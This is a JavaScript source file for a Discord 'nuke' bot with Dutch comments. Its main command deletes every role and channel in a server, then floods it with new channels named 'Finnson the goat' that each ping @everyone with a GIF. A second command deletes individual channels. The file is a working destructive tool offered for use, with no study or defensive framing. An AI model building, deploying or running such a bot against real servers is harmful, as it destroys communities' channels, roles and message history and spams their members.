import { Client, GatewayIntentBits, PermissionsBitField } from 'discord.js';
import http from 'http';

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const PREFIX = '.1';
const GIF_URL = "https://cdn.discordapp.com/attachments/1522698849276268634/1522701428466909326/togif.gif";

// === HTTP SERVER VOOR RENDER ===
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot is running!');
});

server.listen(3000, () => {
    console.log('🌐 HTTP server draait op poort 3000 (voor Render)');
});

// ====================== BOT CODE ======================
client.once('ready', () => {
    console.log(`✅ Bot is online als ${client.user.tag}`);
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift()?.toLowerCase();
    const createAmount = parseInt(args[0]) || 8;

    if (command === 'all') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply("❌ Je hebt Administrator rechten nodig!");
        }

        try {
            await message.author.send(`⚠️ **FULL SERVER NUKE** ⚠️\n1. Rollen verwijderen\n2. Channels verwijderen\n3. ${createAmount} "Finnson the goat" channels maken\n\nTyp \`.1cancel\` om te stoppen.`);
        } catch (e) {
            await message.reply("⚠️ Ik kon geen DM sturen.");
        }

        let cancelled = false;
        const collector = message.channel.createMessageCollector({
            filter: m => m.author.id === message.author.id && m.content.toLowerCase() === '.1cancel',
            time: 5000
        });

        collector.on('collect', () => cancelled = true);

        await new Promise(r => setTimeout(r, 5000));
        if (cancelled) return;

        // 1. Rollen verwijderen
        await message.reply("🗑️ **Alle rollen worden verwijderd...**");
        const rolesToDelete = message.guild.roles.cache.filter(role => role.name !== "@everyone" && role.editable);
        for (const role of rolesToDelete.values()) {
            try { await role.delete(); await new Promise(r => setTimeout(r, 300)); } catch {}
        }

        // 2. Channels verwijderen
        await message.channel.send("🗑️ **Alle channels worden verwijderd...**");
        const channelsToDelete = message.guild.channels.cache.filter(ch => ch.deletable);
        for (const [, channel] of channelsToDelete) {
            try { await channel.delete(); await new Promise(r => setTimeout(r, 200)); } catch {}
        }

        // 3. Nieuwe channels
        await message.channel.send(`✅ Nu **${createAmount}** channels aanmaken...`);

        for (let i = 1; i <= createAmount; i++) {
            try {
                const newChannel = await message.guild.channels.create({
                    name: "Finnson the goat",
                    type: 0,
                });
                await newChannel.send(`@everyone\n${GIF_URL}`);
                await new Promise(r => setTimeout(r, 500));
            } catch {}
        }

        await message.channel.send(`🚀 **FULL NUKE KLAAR!**`);
        return;
    }

    // Normale delete
    let targetChannel = args.length > 0 ? message.mentions.channels.first() : message.channel;
    if (!targetChannel) return message.reply("❌ Geen kanaal gevonden.");

    if (!message.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) 
        return message.reply("❌ Geen toestemming.");

    try {
        await targetChannel.delete();
        if (targetChannel.id !== message.channel.id) message.reply(`🗑️ **${targetChannel.name}** verwijderd.`).catch(() => {});
    } catch {
        message.reply("❌ Kon niet verwijderen.").catch(() => {});
    }
});

client.login(process.env.TOKEN);
